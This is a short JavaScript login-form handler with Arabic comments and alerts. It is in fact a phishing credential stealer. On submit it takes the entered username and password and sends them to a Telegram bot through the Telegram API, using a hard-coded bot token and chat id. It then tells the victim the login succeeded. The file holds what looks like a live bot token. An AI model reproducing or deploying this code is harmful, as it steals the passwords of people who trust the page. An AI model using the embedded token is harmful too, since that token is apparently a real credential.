document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = event.target[0].value;
    const password = event.target[1].value;

    // هنا يتم إرسال البيانات إلى بوت Telegram
    const token = "7863386939:AAG5rUnhqDJafJcXWgzcvNdS1QNbtEcd8kQ";
    const chat_id = "6709124569";
    const message = `اسم المستخدم: ${username}\nكلمة السر: ${password}`;
    
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chat_id,
            text: message
        })
    })
    .then(response => {
        if (response.ok) {
            alert('تم تسجيل الدخول بنجاح!');
            // يمكنك هنا إعادة توجيه المستخدم إلى صفحة أخرى أو تغيير الواجهة
        } else {
            alert('حدث خطأ أثناء تسجيل الدخول.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('حدث خطأ أثناء تسجيل الدخول.');
    });
});